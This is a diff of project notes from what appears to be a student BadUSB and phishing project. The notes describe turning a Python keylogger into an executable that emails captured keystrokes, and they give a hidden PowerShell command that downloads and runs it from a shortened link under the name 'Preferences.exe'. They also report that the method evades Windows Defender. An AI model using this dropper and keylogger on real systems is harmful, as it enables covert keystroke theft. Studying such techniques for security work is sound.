@@ -158,3 +158,40 @@ void loop() {
 }
 ```
 One thing I noticed is that this method is much faster on getting the malware app to pop up than the previous code from yesterday, so this going to be the one that we're going to use for this project.
+
+### 24.10.2023
+
+Today we tried to work on our keylogger part of the project. sawulohi did some [testings](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/notes.md#keylogging-with-digispark) with Arduino and encountered some problems related to Windows Defender, so we had to find a different approach. First thing that came to my mind was to do the keylogger same way that I had done the [ransomware application](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/ransom_app), which means converting a python script to an executable and running it through powershell commands. 
+
+I found this already made keylogger from [thepythoncode.com](https://thepythoncode.com/article/write-a-keylogger-python) made by Abdeladim Fadheli, which covered everything thats inside the code. I tested it quickly by running it and it works! After 60 seconds it creates a file from given keystrokes. [Full code](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog.py)
+
+![5FS1L9Q](https://github.com/therealhalonen/PhishSticks/assets/112076418/c266dc9f-b49c-4589-a33e-d8ce27c7fab3)
+
+The python keylogger script offers an option to send given keystrokes to an email, so I made an email for our project and added it to our version of the script. Next thing I did was: convert .py file to .exe file and add some nice icon to it. I did this like I had previously done [here.](https://github.com/therealhalonen/PhishSticks/blob/master/notes/rajala/notes.md#4102023)
+
+To test this, I uploaded the [keylog.exe](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog.exe) and used basically the same command that I had used with the ransomware application:
+
+I shortened the link so it fits in the Run bar and disguised the keylog.exe to Preferences.exe for fun:
+```
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yc53e7vs', \"$env:UserProfile/Preferences.exe\");Start-Process \"$env:UserProfile/Preferences.exe\" -WorkingDir \"$env:UserProfile\""
+```
+![2023-10-24_17-24](https://github.com/therealhalonen/PhishSticks/assets/112076418/7d6782be-f0bb-49a4-9368-893c36d703d0)
+
+Executing the command downloads and runs the keylogger in the background. Every minute it sends all the keystrokes it catched to our email. 
+
+View from task manager looks like this: 
+
+![kuva](https://github.com/therealhalonen/PhishSticks/assets/112076418/a76e1178-7ab0-452b-b8d0-f5283addbf5a)
+
+After a minute of typing random stuff in my notepad I get an email:
+
+![2023-10-24_17-28](https://github.com/therealhalonen/PhishSticks/assets/112076418/6db9dbee-44e9-4d33-bb9a-328edc8277ed)
+
+Works! And this method also seems to pass Windows Defender for some reason. 
+
+[therealhalonen](https://github.com/therealhalonen/PhishSticks/blob/master/notes/halonen/notes.md#24102023) had different approach than me, but he also bypassed Windows Defender with his [powershell script](https://github.com/therealhalonen/PhishSticks/blob/master/notes/halonen/notes_res/helper.ps1). 
+
+TO DO:
+- Apply and test this with DigiSpark
+
+
